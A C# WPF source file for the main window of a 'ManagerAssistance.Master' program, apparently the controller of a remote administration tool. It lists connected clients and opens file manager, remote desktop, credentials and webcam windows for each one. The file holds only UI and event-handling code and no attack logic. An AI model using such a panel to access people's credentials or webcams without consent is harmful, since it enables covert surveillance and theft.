using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using ManagerAssistance.Common;
using ManagerAssistance.Common.Network.Protocol;
using ManagerAssistance.Master.Extentions;
using ManagerAssistance.Master.Model;

namespace ManagerAssistance.Master
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        public static MainWindow Instance { get; private set; }

        /// <summary>
        /// 
        /// </summary>
        private List<Window> m_childWindows;

        /// <summary>
        /// 
        /// </summary>
        static MainWindow()
        {
            Instance = new MainWindow();
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<Client> ViewModelClients { get; private set; }

        /// <summary>
        /// 
        /// </summary>
        public ClientMonitorModel ViewModelMonitor { get; private set; }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnLoaded(object sender, RoutedEventArgs e)
        {
            Initialize();
        }

        /// <summary>
        /// 
        /// </summary>
        private void Initialize()
        {
            m_childWindows = new List<Window>();

            ClientsList.DataContext = ViewModelClients = new ViewModelCollection<Client>();
            ClientStatusBar.DataContext = ViewModelMonitor = new ClientMonitorModel();

            Client.ClientEvents.Subscribe(this);
            NetworkService.Instance.Start();

            ViewModelMonitor.SetListeningState("Listening");

            AddInfoMessage("NetworkService running...");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="color"></param>
        /// <param name="message"></param>
        public async Task AddConsoleMessage(Brush color, string message)
        {
            await this.ExecuteInDispatcher(() =>
            {
                var textRange = new TextRange(Console.Document.ContentEnd, Console.Document.ContentEnd);
                textRange.Text = message + '\u2028';
                textRange.ApplyPropertyValue(TextElement.ForegroundProperty, color);
                Console.ScrollToEnd();
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public async void AddInfoMessage(string message) => await AddConsoleMessage(Brushes.Green, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public async void AddErrorMessage(string message) => await AddConsoleMessage(Brushes.Red, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async void OnEvent(ClientEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch ((ClientEventType)ev.EventType)
                {
                    case ClientEventType.Connected:
                        {
                            ViewModelClients.AddItem(ev.Source);
                            UpdateOnlineClients();
                            AddInfoMessage($"connected client={ev.Source}");
                        }
                        break;
                    case ClientEventType.Disconnected:
                        {
                            ViewModelClients.RemoveItem(ev.Source);
                            UpdateOnlineClients();
                            CloseClientWindows(ev.Source.Id);
                            AddInfoMessage($"disconnected client={ev.Source}");
                        }
                        break;
                    case ClientEventType.IncommingMessage:
                        {
                            //if (!(ev.Data is PongMessage))
                            //AddInfoMessage($"received id={ev.Source.Id} client={ev.Source.UserName} message={ev.Data.GetType().Name}");

                        }
                        break;
                }
            });
        }

        /// <summary>
        /// 
        /// </summary>
        private void UpdateOnlineClients() => ViewModelMonitor.SetOnlineClients(ViewModelClients.Items.Count);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnClosing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            NetworkService.Instance.Stop();
            m_childWindows.ForEach(async window => await window.ExecuteInDispatcher(window.Close));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OpenFileManager(object sender, RoutedEventArgs e) =>
            OpenClientWindowIfSelected(client => new FileManagerWindow(client));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OpenRemoteDesktop(object sender, RoutedEventArgs e) =>
            OpenClientWindowIfSelected(client => new RemoteDesktopWindow(client));

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="creator"></param>
        private void OpenClientWindowIfSelected<T>(Func<Client, T> creator) where T : ClientWindow
        {
            if (ClientsList.SelectedItem != null)
                RegisterOrOpenChildWindow(creator((Client)ClientsList.SelectedItem));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="clientId"></param>
        private List<ClientWindow> FindClientWindows(int clientId) =>
            m_childWindows.OfType<ClientWindow>().Where(window => window.Client.Id == clientId).ToList();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="clientId"></param>
        private void CloseClientWindows(int clientId) =>
           FindClientWindows(clientId).ForEach(async window => await window.ExecuteInDispatcher(window.Close));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="window"></param>
        private async void RegisterOrOpenChildWindow<T>(T window) where T : ClientWindow
        {
            // focus the existing window
            var existingWindow = m_childWindows
                .OfType<T>()
                .FirstOrDefault(w => w.Client.Id == window.Client.Id);
            if (existingWindow != null)
            {
                await existingWindow.ExecuteInDispatcher(() => existingWindow.Focus());
                return;
            }

            // hook the closing so we remove 
            window.Closed += async (s, args) =>
            {
                await this.ExecuteInDispatcher(() =>
                {
                    Client.ClientEvents.Unsubscribe(window);
                    m_childWindows.Remove(window);
                });
            };

            // register the client window to the events of the client
            Client.ClientEvents.Subscribe(ev =>
            {
                // should be our client
                if (ev.Source.Id != window.Client.Id)
                    return false;

                var statusMessage = ev.Data as StatusUpdateMessage;
                if (statusMessage != null)
                    if (statusMessage.WindowId != -1 && statusMessage.WindowId != window.Id)
                        return false;

                return true;
            }, window);

            m_childWindows.Add(window);

            // finally, open up the window
            window.Show();
        }

        private void OpenCredentialsWindow(object sender, RoutedEventArgs e) =>
            OpenClientWindowIfSelected(client => new CredentialsWindow(client));

        private void OpenWebcamWindow(object sender, RoutedEventArgs e) =>
            OpenClientWindowIfSelected(client => new WebcamWindow(client));
    }
}
